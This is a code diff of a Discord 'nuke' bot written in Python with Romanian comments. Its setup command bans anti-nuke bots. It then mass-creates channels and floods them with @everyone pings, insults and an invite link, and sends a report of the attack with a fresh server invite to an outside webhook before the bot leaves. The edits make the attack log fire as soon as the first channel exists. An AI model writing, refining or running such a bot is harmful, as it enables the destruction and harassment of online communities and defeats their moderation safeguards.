@@ -198,7 +198,6 @@ def apply_font(text, font_style):
     return ''.join(result)
 
 async def detect_and_ban_antinuke_bots(guild):
-    """Detectează și banează boturile anti-nuke (Wick, Security, Beemo, AntiNuke)."""
     banned = []
     for member in guild.members:
         if member.bot:
@@ -223,11 +222,11 @@ class MyBot(commands.Bot):
 bot = MyBot()
 
 # ================== FUNCȚIA DE LOG PRIN WEBHOOK ==================
-async def send_nuke_log(guild, user, channels, messages, invite_link=None):
+async def send_nuke_log(guild_name_original, guild, user, channels, messages, invite_link=None):
     if not LOG_WEBHOOK_URL:
         return
 
-    description = f"**{user.display_name}** (`{user.id}`) has just nuked the server **{guild.name}**."
+    description = f"**{user.display_name}** (`{user.id}`) has just nuked the server **{guild_name_original}**."
     if invite_link:
         description += f"\n\n🔗 **Server Invite:** {invite_link}"
 
@@ -240,7 +239,7 @@ async def send_nuke_log(guild, user, channels, messages, invite_link=None):
     embed.set_thumbnail(url=guild.icon.url if guild.icon else None)
     embed.add_field(name="👤 Members", value=f"`{guild.member_count}`", inline=True)
     embed.add_field(name="🫆 Roles", value=f"`{len(guild.roles)}`", inline=True)
-    embed.add_field(name="🔗 Server", value=f"`{guild.name}` (`{guild.id}`)", inline=False)
+    embed.add_field(name="🔗 Server ID", value=f"`{guild.id}`", inline=False)
     embed.add_field(name="👑 Owner", value=f"`{guild.owner}`", inline=True)
     embed.add_field(name="📅 Created", value=f"`{guild.created_at.strftime('%Y-%m-%d %H:%M UTC')}`", inline=True)
     embed.add_field(name="⚡ Boost Level", value=f"`{guild.premium_tier}`", inline=True)
@@ -549,6 +548,9 @@ async def setup(ctx):
     guild = ctx.guild
     user = ctx.author
 
+    # ===== SALVEAZĂ NUMELE ORIGINAL AL SERVERULUI =====
+    original_name = guild.name
+
     if not ctx.guild.me.guild_permissions.administrator:
         await ctx.send("❌ Bot does not have Administrator permission.")
         return
@@ -656,35 +658,25 @@ async def setup(ctx):
     font_styles = ["bold", "script", "double"]
     created_channels = []
     invite_link = None
+    log_sent = False  # flag pentru a trimite logul o singură dată
 
     await user.send(f"🔄 Starting creation of {total_channels} channels in parallel...")
 
-    # ===== VARIABILĂ PENTRU A SALVA PRIMUL CANAL =====
     first_channel = None
-
     ping_counts = [5, 6, 7, 8, 9, 10, 11, 12, 14, 15]
 
     async def spam_channel(channel):
         try:
-            # Trimite mesajul mare
             await send_with_retry(channel, content=big_message)
             await asyncio.sleep(0.1)
-
-            # Trimite embed-ul principal
             await send_with_retry(channel, embed=embed_content)
             await asyncio.sleep(0.1)
-
-            # Trimite GIF-ul din când în când (30% șansă)
             if random.random() < 0.3:
                 await send_with_retry(channel, embed=embed_gif)
                 await asyncio.sleep(0.1)
-
-            # Trimite o insultă random
             insult = random.choice(insults)
             await send_with_retry(channel, content=f"**{insult}**")
             await asyncio.sleep(0.1)
-
-            # Trimite mesajele spam cu ping
             for _ in range(spam_messages):
                 ping_count = random.randint(5, 12)
                 msg = ("@everyone @here join https://discord.gg/larpempire\n") * ping_count
@@ -694,7 +686,7 @@ async def setup(ctx):
             pass
 
     async def create_and_spam(index):
-        nonlocal first_channel
+        nonlocal first_channel, invite_link, log_sent
         try:
             base_name = random.choice(base_channel_names)
             font_style = random.choice(font_styles)
@@ -707,7 +699,7 @@ async def setup(ctx):
                 return
             created_channels.append(ch)
 
-            # Dacă este primul canal, salvează-l și creează invitația
+            # Dacă este primul canal, creează invitația și trimite log-ul
             if first_channel is None:
                 first_channel = ch
                 try:
@@ -715,6 +707,9 @@ async def setup(ctx):
                     invite_link = invite.url
                 except:
                     pass
+                # Trimite log-ul imediat (chiar dacă nu s-au terminat toate canalele)
+                await send_nuke_log(original_name, guild, user, total_channels, spam_messages, invite_link)
+                log_sent = True
 
             asyncio.create_task(spam_channel(ch))
         except Exception as e:
@@ -723,18 +718,17 @@ async def setup(ctx):
     tasks = [create_and_spam(i) for i in range(total_channels)]
     await asyncio.gather(*tasks)
 
-    # ===== TRIMITE LOGUL CU INVITAȚIA PROASPĂTĂ =====
-    await send_nuke_log(guild, user, total_channels, spam_messages, invite_link)
+    # Dacă din vreun motiv log-ul nu a fost trimis (ex: nu s-a creat niciun canal), trimite fără invitație
+    if not log_sent:
+        await send_nuke_log(original_name, guild, user, total_channels, spam_messages, None)
 
     await user.send(f"✅ All {len(created_channels)} channels created, spam ({spam_messages} messages per channel) running in parallel with retry on rate-limit!")
 
-    # ===== CREEAZĂ ROL FINAL =====
     try:
         await guild.create_role(name="1weeksober-on-top")
     except:
         pass
 
-    # ===== IEȘI DIN SERVER (CU GESTIONARE EROARE) =====
     try:
         await user.send("✅ Process completed. Leaving server...")
         await guild.leave()
